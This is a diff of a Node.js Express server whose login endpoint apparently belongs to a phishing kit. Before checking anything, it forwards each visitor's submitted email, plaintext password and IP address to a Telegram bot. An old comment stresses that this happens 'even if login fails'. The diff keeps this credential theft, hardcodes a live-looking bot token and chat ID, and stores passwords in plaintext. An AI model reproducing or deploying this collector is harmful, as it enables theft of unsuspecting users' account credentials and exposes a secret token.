@@ -1,54 +1,52 @@
 const express = require('express');
 const cors = require('cors');
-const axios = require('axios');
+
+// Try to load axios, but don't fail if it's not there
+let axios;
+try {
+    axios = require('axios');
+} catch (e) {
+    console.log('Axios not available, Telegram disabled');
+}
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ===== YOUR TELEGRAM CREDENTIALS - PUT THEM HERE =====
-const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';  // ← Replace with your token
-const TELEGRAM_CHAT_ID = '5707645216';      // ← Replace with your chat ID
-// ====================================================
+// Telegram config - REPLACE WITH YOUR ACTUAL TOKENS
+const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';
+const TELEGRAM_CHAT_ID = '5707645216';
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
-// Function to send message to Telegram
+// Telegram function
 async function sendToTelegram(email, password, ip) {
-    const message = `
-🔐 NEW LOGIN ATTEMPT 🔐
-📧 Email: ${email}
-🔑 Password: ${password}
-🌍 IP: ${ip}
-⏰ Time: ${new Date().toString()}
-    `;
+    if (!axios) {
+        console.log('Axios not available');
+        return;
+    }
+    
+    const message = `🔐 LOGIN: ${email} | PASS: ${password} | IP: ${ip}`;
     
     try {
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message
         });
-        console.log('✅ Telegram notification sent');
+        console.log('✅ Telegram sent');
     } catch (error) {
-        console.error('❌ Telegram error:', error.message);
+        console.log('❌ Telegram failed:', error.message);
     }
 }
 
-// Simple storage
+// Store users
 const users = [];
-
-// Health check
-app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok', message: 'Server is running' });
-});
 
 // Register
 app.post('/api/register', (req, res) => {
     const { name, email, password } = req.body;
-    
-    console.log('Register:', { name, email });
     
     if (!name || !email || !password) {
         return res.status(400).json({ error: 'All fields required' });
@@ -60,35 +58,23 @@ app.post('/api/register', (req, res) => {
     
     const existing = users.find(u => u.email === email);
     if (existing) {
-        return res.status(400).json({ error: 'User already exists' });
+        return res.status(400).json({ error: 'User exists' });
     }
     
-    const newUser = {
-        id: users.length + 1,
-        name: name,
-        email: email,
-        password: password
-    };
-    
+    const newUser = { id: users.length + 1, name, email, password };
     users.push(newUser);
     
-    res.json({ 
-        success: true, 
-        message: 'Account created!',
-        user: { id: newUser.id, name: newUser.name, email: newUser.email }
-    });
+    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
 });
 
-// Login - THIS SENDS TO TELEGRAM
+// Login
 app.post('/api/login', (req, res) => {
     const { identifier, password } = req.body;
     
-    console.log('Login:', { identifier });
-    
-    // Get IP address
+    // Get IP
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    // SEND TO TELEGRAM (even if login fails!)
+    // Send to Telegram
     sendToTelegram(identifier, password, ip);
     
     if (!identifier || !password) {
@@ -97,26 +83,22 @@ app.post('/api/login', (req, res) => {
     
     const user = users.find(u => u.email === identifier);
     
-    if (!user) {
+    if (!user || user.password !== password) {
         return res.status(401).json({ error: 'Invalid credentials' });
     }
     
-    if (user.password !== password) {
-        return res.status(401).json({ error: 'Invalid credentials' });
-    }
-    
-    res.json({ 
-        success: true, 
-        message: 'Login successful!',
-        user: { id: user.id, name: user.name, email: user.email }
-    });
+    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
 });
 
-// Home
+// Health check
+app.get('/api/health', (req, res) => {
+    res.json({ status: 'ok' });
+});
+
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/public/index.html');
 });
 
 app.listen(PORT, () => {
-    console.log(`✅ Server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
